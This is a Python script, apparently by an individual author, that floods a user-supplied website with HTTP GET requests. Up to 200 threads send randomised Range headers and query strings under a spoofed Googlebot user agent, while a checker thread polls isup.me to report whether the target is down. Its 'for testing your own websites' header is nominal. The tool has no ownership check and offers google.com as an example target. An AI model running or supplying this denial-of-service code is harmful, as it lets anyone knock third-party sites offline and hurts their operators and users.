# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru

import http.client
import threading
import urllib.parse
import time
import random
import sys

# Global variables
target = None  # e.g. "http://google.com" or "http://195.208.0.133"
thread_limit = 200  # default 200
user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
# Global variables end


class Flooder(threading.Thread):
        global target, user_agent

        def __init__(self):
                threading.Thread.__init__(self)

        def run(self):
                try:
                        while True:
                                randint = random.randint(0, 1024)
                                conn = http.client.HTTPConnection(target.netloc, timeout=30000)
                                cur_header = {
                                        "Content-type": "application/x-www-form-urlencoded",
                                        "Accept": "text/html; q=.8; mxb=100000; mxt=5.0, text/x-c",
                                        "Accept-Encoding": "gzip,deflate",
                                        "Connection": "",
                                        "Cache-Control": "no-cache",
                                        "Pragma": "no-cache",
                                        "Range": "bytes=" + str(randint) + "-",
                                        "User-agent": user_agent
                                }
                                if randint % 2 == 0:
                                        cur_header["Connection"] = "Keep-Alive"
                                else:
                                        cur_header["Connection"] = "Close"
                                conn.request("GET", target.path + "?message=" + str(randint), headers=cur_header)
                except:
                        # some handle code here
                        pass


class Checker(threading.Thread):
        current_sec = None

        def __init__(self):
                threading.Thread.__init__(self)

        def run(self):
                while True:
                        if time.localtime().tm_sec % 15 == 0 and self.current_sec != time.localtime().tm_sec:
                                self.current_sec = time.localtime().tm_sec
                                try:
                                        conn = http.client.HTTPConnection("www.isup.me")
                                        conn.request("GET", "/" + target.netloc + target.path)
                                        if conn.getresponse().read().decode().find("It's just you") > 0:
                                                status = "up"
                                        else:
                                                status = "down"
                                        print("The website is", status)
                                except:
                                        print("Can't check website status")

if len(sys.argv) == 2:
        target = sys.argv[1]
else:
        print('Enter target url or IP ( e.g. "http://google.com" or "http://195.208.0.133"):')
        target = input()

target = urllib.parse.urlparse(target)
if target.netloc.__len__() == 0:
        print("Incorrect url input")
        exit()

print("Flooding %s" % target.netloc)
Checker().start()
while True:
        if threading.active_count() < thread_limit:
                Flooder().start()
